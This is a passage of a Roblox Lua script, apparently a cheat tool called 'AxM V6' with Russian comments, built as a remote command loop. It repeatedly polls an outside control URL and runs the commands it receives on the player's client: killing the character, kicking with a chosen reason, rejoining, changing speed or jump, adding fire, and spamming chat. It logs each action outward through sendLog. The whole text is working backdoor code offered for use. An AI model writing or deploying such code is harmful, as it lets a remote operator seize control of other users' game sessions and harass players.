-- ГЛАВНЫЙ ЦИКЛ КОНТРОЛЯ
task.spawn(function()
    local last_cmd = "safe"
    warn("AxM V6: ONLINE. Waiting for commands...")

    while true do
        local response = nil
        local cache_buster = settings.control .. "?t=" .. tick()
        
        -- Попытка 1: Стандартный HttpGet
        local s, r = pcall(function() return game:HttpGet(cache_buster) end)
        if s then response = r end
        
        -- Попытка 2: Если HttpGet не сработал, пробуем через запрос читов
        if not response then
            local req = requestFunc({Url = cache_buster, Method = "GET", Headers = {["Cache-Control"] = "no-cache"}})
            if req and req.Body then response = req.Body end
        end

        if response then
            local clean_res = response:match("^%s*(.-)%s*$") or ""
            local current_cmd = clean_res:lower()

            if current_cmd ~= last_cmd then
                last_cmd = current_cmd
                print("NEW COMMAND: " .. current_cmd)

                if current_cmd == "kill" then
                    sendLog("💀 KILL", "Eliminated via panel", 0xFF0000)
                    if lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
                        lp.Character:FindFirstChildOfClass("Humanoid").Health = 0
                    end
                elseif current_cmd:find("kick") then
                    local reason = clean_res:match("%((.-)%)") or "Bye!"
                    sendLog("🚪 KICK", "Reason: "..reason, 0xFF4500)
                    task.wait(0.5)
                    lp:Kick(reason)
                elseif current_cmd == "rejoin" then
                    sendLog("🔄 REJOIN", "Reconnecting...", 0x2ECC71)
                    TeleportService:Teleport(game.PlaceId, lp)
                elseif current_cmd:find("speed") then
                    current_config.speed = tonumber(clean_res:match("%((%d+)%)")) or 16
                    sendLog("⚡ SPEED", "New: "..current_config.speed, 0x3498DB)
                elseif current_cmd:find("jump") then
                    current_config.jump = tonumber(clean_res:match("%((%d+)%)")) or 50
                    sendLog("🚀 JUMP", "New: "..current_config.jump, 0x3498DB)
                elseif current_cmd == "fire" then
                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                        local f = Instance.new("Fire", lp.Character.HumanoidRootPart)
                        f.Name = "AxMFire"
                        sendLog("🔥 FIRE", "Enabled", 0xE67E22)
                    end
                elseif current_cmd == "unfire" then
                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                        local f = lp.Character.HumanoidRootPart:FindFirstChild("AxMFire")
                        if f then f:Destroy() end
                        sendLog("💧 UNFIRE", "Disabled", 0x34495E)
                    end
                elseif current_cmd:find("chat_spam") then
                    local msg = clean_res:match("%((.-)%)") or "..."
                    current_config.spamming = true
                    sendLog("💬 SPAM", "Msg: "..msg, 0x1ABC9C)
                    task.spawn(function()
                        local event = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
                        while current_config.spamming do
                            if event then event:FireServer(msg, "All") end
                            task.wait(0.7)
                        end
                    end)
                elseif current_cmd == "stop_spam" then
                    current_config.spamming = false
                elseif current_cmd == "safe" then
                    -- Просто сброс, лог не нужен
                end
            end
        end
        task.wait(settings.check_delay)
    end
end)

